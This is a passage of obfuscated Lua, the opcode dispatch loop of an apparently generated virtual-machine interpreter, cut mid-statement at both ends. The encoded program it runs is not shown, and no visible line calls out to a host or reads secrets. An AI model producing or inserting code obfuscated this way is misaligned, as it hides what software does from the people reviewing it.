break;end;end;n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];for m=y[898],y[716],1 do w[m]=nil;end;n=n+1;y=f[n];n=y[716];else local m;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];m=y[898]w[m]=w[m](r(w,m+1,y[716]))end;elseif 272>=z then if z<=269 then if z<=267 then local m=y[898]w[m](w[m+1])elseif z>268 then local m;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];m=y[898]w[m](r(w,m+1,y[716]))else local m;local v;local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];ba=y[898]v={w[ba](w[ba+1])};m=0;for bb=ba,y[585]do m=m+1;w[bb]=v[m];end end;elseif 270>=z then local m;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];m=y[898]w[m]=w[m](r(w,m+1,y[716]))elseif 271==z then local m;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];m=y[898]w[m]=w[m](r(w,m+1,y[716]))else w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;end;elseif z<=275 then if z<=273 then local m;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];m=y[898];do return w[m](r(w,m+1,y[716]))end;n=n+1;y=f[n];m=y[898];do return r(w,m,p)end;elseif z>274 then local m;local v;local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];ba=y[898]v={w[ba](w[ba+1])};m=0;for bb=ba,y[585]do m=m+1;w[bb]=v[m];end else w[y[898]]=w[y[716]]*y[585];end;elseif 276>=z then w[y[898]]=false;elseif z>277 then local m;local v;local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];ba=y[898]v={w[ba](w[ba+1])};m=0;for bb=ba,y[585]do m=m+1;w[bb]=v[m];end else local m;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];m=y[898]w[m]=w[m](r(w,m+1,y[716]))end;elseif z<=324 then if z<=301 then if z<=289 then if 283>=z then if z<=280 then if z>279 then local m;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]]*y[585];n=n+1;y=f[n];w[y[898]]=w[y[716]]+w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]]+w[y[585]];n=n+1;y=f[n];m=y[898]w[m]=w[m](r(w,m+1,y[716]))else local m;w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];m=y[898]w[m]=w[m](r(w,m+1,y[716]))end;elseif 281>=z then local m;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=false;n=n+1;y=f[n];m=y[898]w[m](w[m+1])elseif z>282 then local m;local v;local ba;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]v={w[ba](w[ba+1])};m=0;for bb=ba,y[585]do m=m+1;w[bb]=v[m];end else w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];if(w[y[898]]~=y[585])then n=n+1;else n=y[716];end;end;elseif z<=286 then if z<=284 then local m;local v;local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];ba=y[898]v={w[ba](w[ba+1])};m=0;for bb=ba,y[585]do m=m+1;w[bb]=v[m];end elseif 286~=z then h[y[716]]=w[y[898]];else local m;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];m=y[898]w[m]=w[m](r(w,m+1,y[716]))end;elseif z<=287 then local m;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];m=y[898]w[m]=w[m](w[m+1])elseif 289~=z then local m;local v;local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[716];v=y[585];m=k(w,g,ba,v);w[y[898]]=m;else local m;w[y[898]]={};n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]][w[y[716]]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]][w[y[716]]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]][w[y[716]]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]][w[y[716]]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]][w[y[716]]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]][w[y[716]]]=w[y[585]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]][w[y[716]]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];m=y[898]w[m](r(w,m+1,y[716]))end;elseif 295>=z then if z<=292 then if 290>=z then local m;w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];m=y[898]w[m]=w[m](r(w,m+1,y[716]))elseif z==291 then w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if w[y[898]]then n=n+1;else n=y[716];end;else a(c,e);n=n+1;y=f[n];w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];end;elseif 293>=z then w[y[898]]={r({},1,y[716])};elseif 295~=z then do return end;else if(w[y[898]]~=y[585])then n=n+1;else n=y[716];end;end;elseif 298>=z then if 296>=z then local a;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];a=y[898]w[a]=w[a](w[a+1])elseif z<298 then local a;local c;local e;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];e=y[716];c=y[585];a=k(w,g,e,c);w[y[898]]=a;else if(w[y[898]]~=w[y[585]])then n=n+1;else n=y[716];end;end;elseif 299>=z then w[y[898]][y[716]]=y[585];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];elseif z==300 then w[y[898]]=y[716]*w[y[585]];else w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if w[y[898]]then n=n+1;else n=y[716];end;end;elseif z<=312 then if z<=306 then if 303>=z then if 303~=z then do return w[y[898]]end else local a;w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=y[585];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];a=y[898]w[a]=w[a](r(w,a+1,y[716]))end;elseif z<=304 then local a=y[898]w[a]=w[a](r(w,a+1,p))elseif 306~=z then local a;w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];a=y[898]w[a]=w[a](r(w,a+1,y[716]))else w[y[898]]=h[y[716]];end;elseif z<=309 then if z<=307 then w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];if(w[y[898]]~=y[585])then n=n+1;else n=y[716];end;elseif 309>z then local a;local c;local e;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];e=y[716];c=y[585];a=k(w,g,e,c);w[y[898]]=a;else local a=y[898]local c,e=i(w[a](r(w,a+1,y[716])))p=e+a-1 local e=0;for m=a,p do e=e+1;w[m]=c[e];end;end;elseif 310>=z then local a;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];a=y[898]w[a]=w[a]()elseif 312>z then local a;local c;local e;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];e=y[898]c={w[e](w[e+1])};a=0;for m=e,y[585]do a=a+1;w[m]=c[a];end else do return end;end;elseif z<=318 then if(z<315 or z==315)then if(313>=z)then local a=y[898];w[a]=w[a]-w[a+2];n=y[716];elseif not(314~=z)then local a=0 while true do if a<=6 then if a<=2 then if a<=0 then w[y[898]]=w[y[716]][y[585]];else if a>1 then y=f[n];else n=n+1;end end else if a<=4 then if 4>a then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if 6>a then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if a<=9 then if a<=7 then n=n+1;else if 9~=a then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end else if a<=11 then if 11>a then n=n+1;else y=f[n];end else if 13~=a then if w[y[898]]then n=n+1;else n=y[716];end;else break end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a<1 then c=nil else w[y[898]]=w[y[716]][y[585]];end else if 3>a then n=n+1;else y=f[n];end end else if a<=5 then if 4<a then n=n+1;else w[y[898]]=w[y[716]];end else if a>6 then w[y[898]]=h[y[716]];else y=f[n];end end end else if a<=11 then if a<=9 then if a>8 then y=f[n];else n=n+1;end else if 11~=a then w[y[898]]=w[y[716]][w[y[585]]];else n=n+1;end end else if a<=13 then if a~=13 then y=f[n];else c=y[898]end else if 15~=a then w[c]=w[c](r(w,c+1,y[716]))else break end end end end a=a+1 end end;elseif(z==316 or z<316)then local a,c=0 while true do if(a==7 or a<7)then if(a<=3)then if a<=1 then if not(0~=a)then c=nil else w[y[898]]=h[y[716]];end else if(a<3)then n=n+1;else y=f[n];end end else if(a<5 or a==5)then if a<5 then w[y[898]]=y[716];else n=n+1;end else if(7>a)then y=f[n];else w[y[898]]=y[716];end end end else if a<=11 then if(a==9 or a<9)then if(a==8)then n=n+1;else y=f[n];end else if not(a~=10)then w[y[898]]=y[716];else n=(n+1);end end else if(a<=13)then if not(12~=a)then y=f[n];else c=y[898]end else if not(15==a)then w[c]=w[c](r(w,(c+1),y[716]))else break end end end end a=a+1 end elseif(z<318)then local a,c,e,m=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if a==0 then c=nil else e=nil end else if a~=3 then m=nil else w[y[898]]=h[y[716]];end end else if a<=5 then if 4<a then y=f[n];else n=n+1;end else if 7>a then w[y[898]]=w[y[716]][y[585]];else n=n+1;end end end else if a<=11 then if a<=9 then if a<9 then y=f[n];else w[y[898]]=h[y[716]];end else if 11>a then n=n+1;else y=f[n];end end else if a<=13 then if 12<a then n=n+1;else w[y[898]]=w[y[716]][y[585]];end else if a==14 then y=f[n];else w[y[898]]=w[y[716]][w[y[585]]];end end end end else if a<=23 then if a<=19 then if a<=17 then if 17~=a then n=n+1;else y=f[n];end else if a<19 then w[y[898]]=h[y[716]];else n=n+1;end end else if a<=21 then if a==20 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end else if a>22 then y=f[n];else n=n+1;end end end else if a<=27 then if a<=25 then if 24<a then n=n+1;else w[y[898]]=w[y[716]][y[585]];end else if 27>a then y=f[n];else m=y[716];end end else if a<=29 then if 29>a then e=y[585];else c=k(w,g,m,e);end else if a~=31 then w[y[898]]=c;else break end end end end end a=a+1 end else local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if a>0 then e=nil else c=nil end else if a<=2 then m=nil else if a==3 then w[y[898]]=h[y[716]];else n=n+1;end end end else if a<=6 then if a==5 then y=f[n];else w[y[898]]=h[y[716]];end else if a<=7 then n=n+1;else if 8==a then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end else if a<=14 then if a<=11 then if a<11 then n=n+1;else y=f[n];end else if a<=12 then w[y[898]]=w[y[716]][w[y[585]]];else if a~=14 then n=n+1;else y=f[n];end end end else if a<=16 then if a==15 then m=y[898]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if a>18 then break else for v=m,y[585]do c=c+1;w[v]=e[c];end end end end end end a=a+1 end end;elseif z<=321 then if z<=319 then local a;local c;local e;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];e=y[898]c={w[e](w[e+1])};a=0;for m=e,y[585]do a=a+1;w[m]=c[a];end elseif 321~=z then local a=y[898];local c=w[a];for e=a+1,y[716]do t(c,w[e])end;else local a;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];a=y[898]w[a]=w[a](r(w,a+1,y[716]))end;elseif z<=322 then w[y[898]]=w[y[716]]-w[y[585]];elseif 323==z then local a;local c;local e;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];e=y[898]c={w[e](w[e+1])};a=0;for m=e,y[585]do a=a+1;w[m]=c[a];end else local a;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];a=y[898]w[a]=w[a](r(w,a+1,y[716]))end;elseif 347>=z then if z<=335 then if 329>=z then if(326==z or 326>z)then if(z==325)then local a,c=0 while true do if(a<=7)then if(a<=3)then if a<=1 then if 1~=a then c=nil else w[y[898]]=h[y[716]];end else if(a<3)then n=(n+1);else y=f[n];end end else if(a<5 or a==5)then if a==4 then w[y[898]]=y[716];else n=(n+1);end else if(6<a)then w[y[898]]=y[716];else y=f[n];end end end else if(a<11 or a==11)then if(a<9 or a==9)then if 8<a then y=f[n];else n=(n+1);end else if(10==a)then w[y[898]]=y[716];else n=(n+1);end end else if(a<=13)then if not(13==a)then y=f[n];else c=y[898]end else if(a>14)then break else w[c]=w[c](r(w,(c+1),y[716]))end end end end a=a+1 end else local a,c=0 while true do if a<=8 then if a<=3 then if(a<1 or a==1)then if 0<a then w[y[898]]=w[y[716]][y[585]];else c=nil end else if(2==a)then n=n+1;else y=f[n];end end else if(a<5 or a==5)then if a>4 then n=n+1;else w[y[898]]=w[y[716]][y[585]];end else if(a<=6)then y=f[n];else if not(7~=a)then w[y[898]]=w[y[716]][y[585]];else n=n+1;end end end end else if(a<13 or a==13)then if(a<10 or a==10)then if(10>a)then y=f[n];else w[y[898]]=w[y[716]][y[585]];end else if(a==11 or a<11)then n=(n+1);else if not(a~=12)then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if a<=15 then if not(14~=a)then n=n+1;else y=f[n];end else if(a==16 or a<16)then c=y[898]else if(17<a)then break else w[c]=w[c](w[(c+1)])end end end end end a=(a+1)end end;elseif(z<327 or z==327)then local a=0 while true do if a<=9 then if(a==4 or a<4)then if(a<1 or a==1)then if not(a==1)then w[y[898]][y[716]]=y[585];else n=n+1;end else if(a==2 or a<2)then y=f[n];else if 4>a then w[y[898]]={};else n=n+1;end end end else if(a<6 or a==6)then if(6>a)then y=f[n];else w[y[898]][y[716]]=w[y[585]];end else if(a<=7)then n=(n+1);else if not(a~=8)then y=f[n];else w[y[898]]=h[y[716]];end end end end else if(a==14 or a<14)then if(a<11 or a==11)then if(a<11)then n=n+1;else y=f[n];end else if(a<=12)then w[y[898]]=w[y[716]][y[585]];else if a>13 then y=f[n];else n=(n+1);end end end else if(a==16 or a<16)then if not(a==16)then w[y[898]][y[716]]=w[y[585]];else n=(n+1);end else if(a<17 or a==17)then y=f[n];else if 18<a then break else w[y[898]][y[716]]=w[y[585]];end end end end end a=a+1 end elseif not(z~=328)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[898]]=w[y[716]][y[585]];end else if a>2 then y=f[n];else n=n+1;end end else if a<=5 then if a>4 then n=n+1;else w[y[898]]=y[716];end else if a==6 then y=f[n];else w[y[898]]=y[716];end end end else if a<=11 then if a<=9 then if 9~=a then n=n+1;else y=f[n];end else if a~=11 then w[y[898]]=y[716];else n=n+1;end end else if a<=13 then if 12<a then c=y[898]else y=f[n];end else if a==14 then w[c]=w[c](r(w,c+1,y[716]))else break end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a~=1 then c=nil else w[y[898]]=h[y[716]];end else if 3~=a then n=n+1;else y=f[n];end end else if a<=5 then if 4==a then w[y[898]]=y[716];else n=n+1;end else if a~=7 then y=f[n];else w[y[898]]=y[716];end end end else if a<=11 then if a<=9 then if 8<a then y=f[n];else n=n+1;end else if 11>a then w[y[898]]=y[716];else n=n+1;end end else if a<=13 then if 13>a then y=f[n];else c=y[898]end else if 15>a then w[c]=w[c](r(w,c+1,y[716]))else break end end end end a=a+1 end end;elseif 332>=z then if z<=330 then local a=y[898]w[a]=w[a]()elseif z~=332 then for a=y[898],y[716],1 do w[a]=nil;end;else local a;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];a=y[898]w[a]=w[a](r(w,a+1,y[716]))end;elseif 333>=z then local a=y[898];p=(a+x-1);for c=a,p do local a=q[(c-a)];w[c]=a;end;elseif z<335 then local a=y[898];do return r(w,a,p)end;else if(w[y[898]]~=w[y[585]])then n=y[716];else n=n+1;end;end;elseif z<=341 then if 338>=z then if z<=336 then local a,c,e,m,q=0 while true do if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if 2>a then e,m=nil else q=nil end end else if a<=3 then w[y[898]]=w[y[716]][w[y[585]]];else if 5>a then n=n+1;else y=f[n];end end end else if a<=8 then if a<=6 then w[y[898]]=w[y[716]];else if a==7 then n=n+1;else y=f[n];end end else if a<=9 then w[y[898]]=y[716];else if 10==a then n=n+1;else y=f[n];end end end end else if a<=17 then if a<=14 then if a<=12 then w[y[898]]=y[716];else if 13==a then n=n+1;else y=f[n];end end else if a<=15 then w[y[898]]=y[716];else if a<17 then n=n+1;else y=f[n];end end end else if a<=20 then if a<=18 then q=y[898]else if a>19 then p=m+q-1 else e,m=i(w[q](r(w,q+1,y[716])))end end else if a<=21 then c=0;else if 23~=a then for m=q,p do c=c+1;w[m]=e[c];end;else break end end end end end a=a+1 end elseif 337==z then local a;local c;local e;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];e=y[898]c={w[e](w[e+1])};a=0;for m=e,y[585]do a=a+1;w[m]=c[a];end else w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if w[y[898]]then n=n+1;else n=y[716];end;end;elseif 339>=z then w[y[898]]={};elseif z<341 then local a=y[898];local c=w[y[716]];w[a+1]=c;w[a]=c[y[585]];else local a;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];a=y[898]w[a]=w[a](r(w,a+1,y[716]))end;elseif 344>=z then if z<=342 then w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];elseif 343==z then local a=y[898]w[a]=w[a](r(w,a+1,y[716]))else w[y[898]]=b(d[y[716]],nil,j);end;elseif 345>=z then local a;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];a=y[898]w[a]=w[a](r(w,a+1,y[716]))elseif 346==z then w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if(w[y[898]]~=w[y[585]])then n=n+1;else n=y[716];end;else local a;w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];a=y[898]w[a]=w[a]()end;elseif 359>=z then if z<=353 then if 350>=z then if 348>=z then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;elseif z>349 then local a;local c,d;local e;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];e=y[898]c,d=i(w[e](r(w,e+1,y[716])))p=d+e-1 a=0;for d=e,p do a=a+1;w[d]=c[a];end;else w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if w[y[898]]then n=n+1;else n=y[716];end;end;elseif z<=351 then w[y[898]]=w[y[716]]/y[585];elseif z==352 then if(w[y[898]]<=w[y[585]])then n=y[716];else n=n+1;end;else local a;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];a=y[898]w[a]=w[a](r(w,a+1,y[716]))end;elseif 356>=z then if 354>=z then local a;local c;local 